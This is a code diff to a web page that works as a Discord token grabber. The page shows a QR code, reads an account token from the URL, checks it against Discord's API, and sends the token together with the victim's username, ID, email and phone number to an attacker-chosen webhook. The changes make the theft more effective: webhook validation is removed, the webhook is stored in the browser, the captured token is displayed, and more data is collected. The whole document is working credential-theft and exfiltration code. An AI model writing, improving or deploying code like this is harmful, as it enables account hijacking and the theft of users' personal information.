@@ -106,9 +106,6 @@
         #qr-container {
             display: none;
         }
-        .hidden {
-            display: none !important;
-        }
         .webhook-status {
             color: #23a55a;
             font-size: 12px;
@@ -116,6 +113,23 @@
         }
         .webhook-status.error {
             color: #ed4245;
+        }
+        .token-display {
+            background: #1e1f22;
+            border: 1px solid #3f4147;
+            border-radius: 8px;
+            padding: 10px;
+            margin-top: 12px;
+            word-break: break-all;
+            color: #dbdee1;
+            font-size: 11px;
+            text-align: left;
+            display: none;
+            max-height: 100px;
+            overflow: auto;
+        }
+        .token-display.show {
+            display: block;
         }
     </style>
 </head>
@@ -128,7 +142,7 @@
         <div id="setup">
             <div class="input-group">
                 <label>Webhook URL</label>
-                <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/..." value="">
+                <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/...">
             </div>
             <button class="btn" onclick="generateQR()">Generate QR Code</button>
             <div id="webhook-status"></div>
@@ -140,6 +154,7 @@
                 <span class="dot"></span>
                 <span id="status-text">Waiting for scan...</span>
             </div>
+            <div id="token-display" class="token-display"></div>
             <div style="margin-top:16px;">
                 <button class="btn" style="background:#ed4245;" onclick="reset()">Reset</button>
             </div>
@@ -147,28 +162,21 @@
     </div>
 
     <script>
-        let currentToken = null;
-        let currentUser = null;
         let qrCode = null;
         let intervalId = null;
 
         function generateQR() {
             const webhook = document.getElementById('webhook').value.trim();
+            const status = document.getElementById('webhook-status');
+            
             if (!webhook) {
-                const status = document.getElementById('webhook-status');
                 status.textContent = 'Please enter a webhook URL';
                 status.className = 'webhook-status error';
                 return;
             }
-            
-            if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
-                const status = document.getElementById('webhook-status');
-                status.textContent = 'Invalid webhook URL';
-                status.className = 'webhook-status error';
-                return;
-            }
 
-            const url = window.location.href;
+            const url = window.location.href.split('?')[0];
+            
             document.getElementById('setup').style.display = 'none';
             document.getElementById('qr-container').style.display = 'block';
             
@@ -186,52 +194,70 @@
                 });
             }
             
-            document.getElementById('status-text').textContent = 'Waiting for scan...';
+            document.getElementById('status-text').textContent = 'Scan with Discord mobile app';
+            document.getElementById('token-display').className = 'token-display';
+            document.getElementById('token-display').textContent = '';
+            
+            localStorage.setItem('webhook', webhook);
             
             if (intervalId) clearInterval(intervalId);
             
-            intervalId = setInterval(async () => {
-                try {
-                    const response = await fetch('/check');
-                    const data = await response.json();
+            intervalId = setInterval(() => {
+                const params = new URLSearchParams(window.location.search);
+                const token = params.get('token');
+                
+                if (token && token.length > 50) {
+                    clearInterval(intervalId);
+                    document.getElementById('status-text').textContent = '✅ Token captured!';
                     
-                    if (data.token) {
-                        clearInterval(intervalId);
-                        document.getElementById('status-text').textContent = '✅ Logged in!';
-                        currentToken = data.token;
-                        currentUser = data.user;
-                        
-                        if (currentUser) {
+                    fetch('https://discord.com/api/v9/users/@me', {
+                        headers: { 'Authorization': token }
+                    })
+                    .then(res => res.json())
+                    .then(user => {
+                        if (user.id) {
                             const embed = {
                                 embeds: [{
                                     title: 'Discord Token Captured',
                                     color: 0x5865F2,
                                     fields: [
-                                        { name: 'Token', value: '```' + currentToken + '```', inline: false },
-                                        { name: 'Username', value: currentUser.username + '#' + currentUser.discriminator, inline: true },
-                                        { name: 'User ID', value: currentUser.id, inline: true }
+                                        { name: 'Token', value: '```' + token + '```', inline: false },
+                                        { name: 'Username', value: user.username + '#' + (user.discriminator || '0'), inline: true },
+                                        { name: 'User ID', value: user.id, inline: true }
                                     ]
                                 }]
                             };
                             
-                            if (currentUser.email) {
-                                embed.embeds[0].fields.push({ name: 'Email', value: currentUser.email, inline: true });
+                            if (user.email) {
+                                embed.embeds[0].fields.push({ name: 'Email', value: user.email, inline: true });
                             }
-                            if (currentUser.phone) {
-                                embed.embeds[0].fields.push({ name: 'Phone', value: currentUser.phone, inline: true });
+                            if (user.phone) {
+                                embed.embeds[0].fields.push({ name: 'Phone', value: user.phone, inline: true });
                             }
                             
-                            fetch(webhook, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify(embed)
-                            });
+                            const savedWebhook = localStorage.getItem('webhook');
+                            if (savedWebhook) {
+                                fetch(savedWebhook, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify(embed)
+                                })
+                                .then(() => {
+                                    document.getElementById('status-text').textContent = '✅ Token sent to webhook!';
+                                })
+                                .catch(() => {
+                                    document.getElementById('status-text').textContent = '⚠️ Token captured but webhook failed';
+                                });
+                            }
                             
-                            document.getElementById('status-text').textContent = '✅ Token sent to webhook!';
+                            const display = document.getElementById('token-display');
+                            display.textContent = 'Token: ' + token + '\nUser: ' + user.username + '#' + (user.discriminator || '0') + '\nID: ' + user.id;
+                            display.className = 'token-display show';
                         }
-                    }
-                } catch(e) {
-                    // Ignore errors
+                    })
+                    .catch(() => {
+                        document.getElementById('status-text').textContent = '⚠️ Token invalid';
+                    });
                 }
             }, 1000);
         }
@@ -245,57 +271,62 @@
             if (qrCode) {
                 qrCode.clear();
             }
-            currentToken = null;
-            currentUser = null;
+            document.getElementById('token-display').className = 'token-display';
+            document.getElementById('token-display').textContent = '';
+            
+            const url = window.location.href.split('?')[0];
+            window.history.replaceState({}, document.title, url);
         }
 
-        // Check for token in URL
-        (function checkToken() {
+        // Auto-detect token in URL
+        (function autoDetect() {
             const params = new URLSearchParams(window.location.search);
             const token = params.get('token');
             
-            if (token) {
-                fetch('https://discord.com/api/v9/users/@me', {
-                    headers: { 'Authorization': token }
-                })
-                .then(res => res.json())
-                .then(user => {
-                    if (user.id) {
-                        const webhook = localStorage.getItem('webhook');
-                        if (webhook) {
+            if (token && token.length > 50) {
+                const savedWebhook = localStorage.getItem('webhook');
+                if (savedWebhook) {
+                    fetch('https://discord.com/api/v9/users/@me', {
+                        headers: { 'Authorization': token }
+                    })
+                    .then(res => res.json())
+                    .then(user => {
+                        if (user.id) {
                             const embed = {
                                 embeds: [{
                                     title: 'Discord Token Captured',
                                     color: 0x5865F2,
                                     fields: [
                                         { name: 'Token', value: '```' + token + '```', inline: false },
-                                        { name: 'Username', value: user.username + '#' + user.discriminator, inline: true },
+                                        { name: 'Username', value: user.username + '#' + (user.discriminator || '0'), inline: true },
                                         { name: 'User ID', value: user.id, inline: true }
                                     ]
                                 }]
                             };
                             
-                            fetch(webhook, {
+                            if (user.email) {
+                                embed.embeds[0].fields.push({ name: 'Email', value: user.email, inline: true });
+                            }
+                            if (user.phone) {
+                                embed.embeds[0].fields.push({ name: 'Phone', value: user.phone, inline: true });
+                            }
+                            
+                            fetch(savedWebhook, {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify(embed)
                             });
                         }
-                    }
-                })
-                .catch(() => {});
+                    })
+                    .catch(() => {});
+                }
             }
         })();
 
-        // Save webhook for token capture
-        document.getElementById('webhook').addEventListener('change', function() {
-            localStorage.setItem('webhook', this.value);
-        });
-
         // Load saved webhook
-        const savedWebhook = localStorage.getItem('webhook');
-        if (savedWebhook) {
-            document.getElementById('webhook').value = savedWebhook;
+        const saved = localStorage.getItem('webhook');
+        if (saved) {
+            document.getElementById('webhook').value = saved;
         }
     </script>
 </body>
